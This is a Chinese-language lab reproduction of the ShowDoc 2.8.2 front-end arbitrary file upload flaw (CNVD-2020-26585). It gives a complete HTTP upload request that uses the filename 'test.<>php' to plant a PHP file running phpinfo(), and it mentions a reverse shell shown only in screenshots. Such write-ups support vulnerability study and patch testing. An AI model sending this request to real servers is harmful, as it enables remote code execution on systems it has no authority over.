# ShowDoc 前台任意文件上传（CNVD-2020-26585）

## 漏洞环境

执行如下命令启动一个ShowDoc 2.8.2服务器：

```plain
docker compose up -d
```

服务启动后，访问http://your-ip:8080即可查看到ShowDoc的主页。

## 漏洞复现

发送如下请求上传一个PHP文件：

```plain
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Length: 213

------WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?=phpinfo();?>
------WebKitFormBoundary0RdOKBR8AmAxfRyl--
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908097051-366be5fd-5077-4ac3-8836-a6cac734f5a7.png)

PHP文件路径将返回在数据包中：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908097196-3d3aab12-5933-4a44-8f28-919effd6022c.png)

访问即可查看到phpinfo()执行结果：![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908097377-e4542148-d6d3-44aa-a898-c66f55607ca5.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908097429-9c147bc9-2c77-4f5c-84ca-6bafc131b6e8.png)

反弹shell

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908097334-989c93d1-1fbf-4a3b-bfdd-7ed21c01753a.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908098721-5e037d40-ee15-4e89-b3bf-fbba84a4a847.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908099535-1e30efc6-b0db-4115-a15f-bc7fbf8e4a5c.png)